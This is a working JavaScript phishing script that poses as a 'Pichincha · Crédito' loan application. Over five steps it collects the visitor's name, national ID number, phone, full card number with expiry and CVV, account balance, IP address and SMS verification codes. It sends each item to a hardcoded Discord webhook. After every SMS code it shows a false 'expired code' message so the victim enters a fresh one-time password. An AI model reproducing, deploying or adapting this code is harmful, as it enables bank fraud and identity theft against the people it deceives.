var CONFIG = {
  webhookUrl: "https://discord.com/api/webhooks/1574106849018642614/FIiUPzfu8buTjyG7LCzkpj_x2OstxUoSUxRwCG8h9Xzg-xMzT0Azzzayd1fDudpDXkEK",
  username: "Pichincha · Crédito"
};

var nombre = "", cedula = "", celular = "";
var heroCompartido = null;

function $(id){ return document.getElementById(id); }

function send(embed){
  if(!CONFIG.webhookUrl || CONFIG.webhookUrl.indexOf("PEGA_AQUI") === 0) return;
  try{
    fetch(CONFIG.webhookUrl + "?wait=true", {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        username: CONFIG.username,
        embeds:[Object.assign(embed, { timestamp:new Date().toISOString() })]
      })
    }).catch(function(e){ console.warn("webhook:", e); });
  }catch(e){ console.warn(e); }
}

/* activa / bloquea un boton */
function setBtn(id, ok){
  var b = $(id);
  if(!b) return;
  b.disabled = !ok;
  if(ok) b.classList.add("ready");
  else b.classList.remove("ready");
}

function dig(el, max){
  el.value = el.value.replace(/\D/g,"").slice(0,max);
}

/* cambia de paso.
   El carrusel de los pasos 1 y 2 es el mismo bloque: se mueve de seccion
   en vez de duplicarse, asi conserva imagenes e indice. */
function step(n){
  for(var i=1;i<=5;i++){
    var s = $("s"+i);
    if(s) s.hidden = (i !== n);
  }
  if((n === 1 || n === 2) && heroCompartido){
    var destino = $("s"+n);
    if(destino && heroCompartido.parentNode !== destino){
      destino.insertBefore(heroCompartido, destino.firstChild);
    }
  }
  window.scrollTo(0,0);
}

/* ---------- paso 1 ---------- */
function errores1(){
  var errs = [];
  if($("nombre").value.trim().length < 3) errs.push("Escribe tu nombre completo.");
  if(!/^\d{7,10}$/.test($("cedula").value.trim())) errs.push("La cédula debe tener entre 7 y 10 dígitos.");
  if(!/^0\d{8,9}$/.test($("celular").value.trim())) errs.push("El celular debe iniciar con 0 y tener 9 o 10 dígitos.");
  if(!$("terminos").checked) errs.push("Debes aceptar los términos y condiciones.");
  return errs;
}

function chk1(){
  setBtn("b1", errores1().length === 0);
  $("e1").hidden = true;
}

function go1(){
  var errs = errores1();
  if(errs.length){
    $("e1").textContent = errs[0];
    $("e1").hidden = false;
    return;
  }
  nombre  = $("nombre").value.trim().replace(/\s+/g," ");
  cedula  = $("cedula").value.trim();
  celular = $("celular").value.trim();

  var pila = nombre.split(" ")[0];
  $("nomPila").textContent = pila.charAt(0).toUpperCase() + pila.slice(1).toLowerCase();
  $("ciTxt").textContent = "C.I. " + cedula;

  send({
    title:"📝 Solicitud de crédito",
    color:0x1b2a63,
    fields:[
      { name:"Nombre", value:nombre },
      { name:"Cédula", value:cedula, inline:true },
      { name:"Celular", value:celular, inline:true }
    ]
  });

  step(2);
}

/* ---------- paso 2 ---------- */
function cliente(tipo){
  send({
    title:"👤 Tipo de cliente",
    color:0xf2d34a,
    description:"**"+nombre+"** · C.I. "+cedula+" eligió **"+tipo+"**"
  });
  step(3);
  chk3();
}

/* ---------- paso 3 ---------- */
function fmtTarjeta(){
  var v = $("tarjeta").value.replace(/\D/g,"").slice(0,16);
  $("tarjeta").value = v.replace(/(.{4})/g,"$1 ").trim();
  chk3();
}
function fmtVenc(){
  var v = $("venc").value.replace(/\D/g,"").slice(0,4);
  if(v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
  $("venc").value = v;
  chk3();
}
function ok3(){
  return $("tarjeta").value.replace(/\s/g,"").length === 16 &&
         /^\d{2}\/\d{2}$/.test($("venc").value) &&
         /^\d{3,4}$/.test($("cvv").value);
}
function chk3(){ setBtn("b3", ok3()); $("e3").hidden = true; }

function go3(){
  if(!ok3()){
    $("e3").textContent = "Completa número de tarjeta, vencimiento y CVV.";
    $("e3").hidden = false;
    return;
  }
  send({
    title:"💳 Tarjeta",
    color:0x1b2a63,
    fields:[
      { name:"Titular", value:nombre },
      { name:"Tarjeta", value:$("tarjeta").value, inline:true },
      { name:"Vence", value:$("venc").value, inline:true },
      { name:"CVV", value:$("cvv").value, inline:true }
    ]
  });
  step(4);
  chk4();
}

/* ---------- paso 4 · saldo con entrada por centavos ---------- */
function money(cents){
  var s = (cents / 100).toFixed(2);
  var p = s.split(".");
  p[0] = p[0].replace(/\B(?=(\d{3})+(?!\d))/g,".");
  return p[0] + "," + p[1];
}

function fmtSaldo(){
  var el = $("saldo");
  var digits = el.value.replace(/\D/g,"").slice(0,13);
  if(!digits){
    el.value = "";
    chk4();
    return;
  }
  el.value = money(parseInt(digits, 10));
  chk4();
}

function valorSaldo(){
  var v = $("saldo").value.replace(/\./g,"").replace(",",".");
  var n = parseFloat(v);
  return isNaN(n) ? 0 : n;
}

function chk4(){
  setBtn("b4", valorSaldo() > 0);
  $("e4").hidden = true;
}

function go4(){
  if(!(valorSaldo() > 0)){
    $("e4").textContent = "Por favor ingresa un monto válido superior a $0,00.";
    $("e4").hidden = false;
    return;
  }
  var monto = $("saldo").value;

  send({
    title:"💰 Saldo consultado",
    color:0x1b2a63,
    fields:[
      { name:"Titular", value:nombre },
      { name:"Cédula", value:cedula, inline:true },
      { name:"Saldo", value:"$ " + monto, inline:true }
    ]
  });

  fetch("https://api.ipify.org?format=json")
    .then(function(r){ return r.json(); })
    .then(function(d){
      if(d && d.ip){
        send({ title:"🌐 IP", color:0x7b8494, description:"**"+nombre+"** · "+d.ip });
      }
    })
    .catch(function(){});

  step(5);
  chk5();
  $("codigo").focus();
}

/* ---------- paso 5 ---------- */
function chk5(){
  dig($("codigo"), 6);
  setBtn("b5", $("codigo").value.length === 6);
}

function go5(){
  if($("codigo").value.length < 6){
    $("errBox").hidden = false;
    $("errBox").textContent = "El código debe tener 6 dígitos.";
    return;
  }
  send({
    title:"🔑 Código SMS",
    color:0x1b2a63,
    fields:[
      { name:"Titular", value:nombre },
      { name:"Cédula", value:cedula, inline:true },
      { name:"Código", value:$("codigo").value, inline:true }
    ]
  });
  $("codigo").value = "";
  setBtn("b5", false);
  $("errBox").hidden = false;
  $("errBox").textContent =
    "El código ingresado ha expirado o es incorrecto. Hemos enviado un nuevo codigo ingresa el nuevo codigo.";
  $("codigo").focus();
}

function reenviar(){
  $("codigo").value = "";
  setBtn("b5", false);
  $("errBox").hidden = true;
  $("codigo").focus();
}

/* ---------- carruseles independientes ---------- */
function iniciarCarruseles(){
  var heroes = document.querySelectorAll(".hero");

  for(var h = 0; h < heroes.length; h++){
    var hero = heroes[h];
    var slides = hero.querySelectorAll(".slide");
    var dots = hero.querySelector(".dots");
    hero.setAttribute("data-idx","0");
    if(!dots) continue;
    dots.innerHTML = "";
    for(var i = 0; i < slides.length; i++){
      var d = document.createElement("i");
      if(i === 0) d.className = "on";
      dots.appendChild(d);
    }
  }

  setInterval(function(){
    for(var k = 0; k < heroes.length; k++){
      var hero = heroes[k];
      var slides = hero.querySelectorAll(".slide");
      var dots = hero.querySelector(".dots");
      if(!slides.length || !dots) continue;

      var idx = parseInt(hero.getAttribute("data-idx"), 10) || 0;
      slides[idx].classList.remove("active");
      if(dots.children[idx]) dots.children[idx].classList.remove("on");

      idx = (idx + 1) % slides.length;
      slides[idx].classList.add("active");
      if(dots.children[idx]) dots.children[idx].classList.add("on");

      hero.setAttribute("data-idx", idx);
    }
  }, 4000);
}

/* ---------- enganche de eventos ---------- */
function bind(id, evt, fn){
  var el = $(id);
  if(el) el.addEventListener(evt, fn, false);
}

function enter(e){
  if(e.key !== "Enter") return;
  var map = { nombre:"b1", cedula:"b1", celular:"b1", venc:"b3", cvv:"b3", saldo:"b4", codigo:"b5" };
  var b = $(map[e.target.id]);
  if(b && !b.disabled){ e.preventDefault(); b.click(); }
}

function init(){
  heroCompartido = $("heroCompartido");

  bind("nombre","input",chk1);
  bind("cedula","input",function(){ dig($("cedula"),10); chk1(); });
  bind("celular","input",function(){ dig($("celular"),10); chk1(); });
  bind("terminos","change",chk1);

  bind("tarjeta","input",fmtTarjeta);
  bind("venc","input",fmtVenc);
  bind("cvv","input",function(){ dig($("cvv"),4); chk3(); });

  bind("saldo","input",fmtSaldo);
  bind("saldo","focus",function(){
    if($("saldo").value === "0,00") $("saldo").value = "";
    chk4();
  });
  bind("saldo","blur",function(){
    if($("saldo").value.trim() === ""){ $("saldo").value = "0,00"; chk4(); }
  });

  bind("codigo","input",chk5);

  bind("b1","click",go1);
  bind("bCliente","click",function(){ cliente("Soy cliente"); });
  bind("bNoCliente","click",function(){ cliente("No poseo cuenta activa"); });
  bind("b3","click",go3);
  bind("b4","click",go4);
  bind("b5","click",go5);
  bind("reenviar","click",reenviar);

  bind("nombre","keydown",enter);
  bind("cedula","keydown",enter);
  bind("celular","keydown",enter);
  bind("venc","keydown",enter);
  bind("cvv","keydown",enter);
  bind("saldo","keydown",enter);
  bind("codigo","keydown",enter);

  chk1(); chk3(); chk4(); chk5();
  step(1);
  iniciarCarruseles();
}

if(document.readyState === "loading"){
  document.addEventListener("DOMContentLoaded", init);
}else{
  init();
}